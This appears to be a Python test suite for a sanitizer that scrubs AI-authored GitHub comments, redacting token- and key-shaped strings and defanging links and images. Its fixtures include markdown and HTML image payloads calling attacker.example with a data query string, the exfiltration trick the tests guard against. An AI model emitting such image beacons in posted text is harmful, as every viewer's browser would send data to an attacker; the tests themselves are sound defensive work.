"""Tests for sanitizing model-authored text before it is posted to GitHub."""

from baloo.github.sanitize import REDACTED, sanitize_posted_body


class TestSecretRedaction:
    def test_redacts_github_token(self):
        body = "Found a token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 in config."

        result = sanitize_posted_body(body)

        assert "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" not in result
        assert REDACTED in result

    def test_redacts_anthropic_and_aws_and_jwt(self):
        body = (
            "sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAA\n"
            "AKIAIOSFODNN7EXAMPLE\n"
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U\n"
        )

        result = sanitize_posted_body(body)

        assert "sk-ant" not in result
        assert "AKIAIOSFODNN7EXAMPLE" not in result
        assert "eyJhbGciOiJIUzI1NiJ9" not in result

    def test_redacts_private_key_block(self):
        body = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow...\n-----END RSA PRIVATE KEY-----"

        result = sanitize_posted_body(body)

        assert "MIIEow" not in result
        assert result == REDACTED

    def test_redacts_credentials_in_a_connection_string(self):
        result = sanitize_posted_body("postgresql://baloo:hunter2@db:5432/baloo")

        assert "hunter2" not in result
        assert "postgresql://" in result

    def test_redacts_inside_code_fences_too(self):
        # A fence renders nothing, but it is still a durable public copy.
        body = "```python\nTOKEN = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\n```"

        result = sanitize_posted_body(body)

        assert "ghp_ABCDEF" not in result

    def test_leaves_commit_shas_and_ordinary_code_alone(self):
        body = "See commit 5f2e9c1a4b7d3e8f0a1b2c3d4e5f60718293a4b5 in `src/auth.py`."

        assert sanitize_posted_body(body) == body


class TestMarkdownNeutralization:
    def test_image_is_replaced_with_inert_text(self):
        # The exfiltration primitive: every viewer's browser fetches this.
        body = "![](https://attacker.example/log?data=secret)"

        result = sanitize_posted_body(body)

        assert "![" not in result
        assert "image removed" in result
        assert "https://attacker.example" not in result
        assert "https[://]attacker.example/log?data=secret" in result

    def test_link_keeps_its_text_and_defangs_the_target(self):
        result = sanitize_posted_body("See [the docs](https://attacker.example/steal).")

        assert "](" not in result
        assert "the docs" in result
        assert "https[://]attacker.example/steal" in result

    def test_bare_and_autolinked_urls_are_defanged(self):
        result = sanitize_posted_body("Visit https://attacker.example and <http://evil.test/x>")

        assert "https://attacker.example" not in result
        assert "http://evil.test/x" not in result
        assert "https[://]attacker.example" in result

    def test_html_img_tag_is_escaped(self):
        result = sanitize_posted_body('<img src="https://attacker.example/log?d=1">')

        assert "<img" not in result
        assert "&lt;img" in result

    def test_links_inside_code_are_left_intact(self):
        # Nothing renders in a fence, and rewriting it would corrupt quoted code.
        body = "```md\n[click](https://example.com/page)\n```\nand `[x](https://example.com)`"

        result = sanitize_posted_body(body)

        assert "[click](https://example.com/page)" in result
        assert "`[x](https://example.com)`" in result

    def test_unterminated_fence_extends_to_the_end(self):
        body = "intro [a](https://example.com/a)\n```\n[b](https://example.com/b)\n"

        result = sanitize_posted_body(body)

        assert "[a](https://example.com/a)" not in result
        assert "[b](https://example.com/b)" in result

    def test_ordinary_review_prose_is_unchanged(self):
        body = (
            "**[HIGH] Security** - `get_user()` builds SQL by concatenation.\n\n"
            "```python\ncursor.execute('SELECT * FROM u WHERE id=' + uid)\n```\n\n"
            "Use a parameterized query instead."
        )

        assert sanitize_posted_body(body) == body

    def test_empty_input(self):
        assert sanitize_posted_body(None) == ""
        assert sanitize_posted_body("") == ""
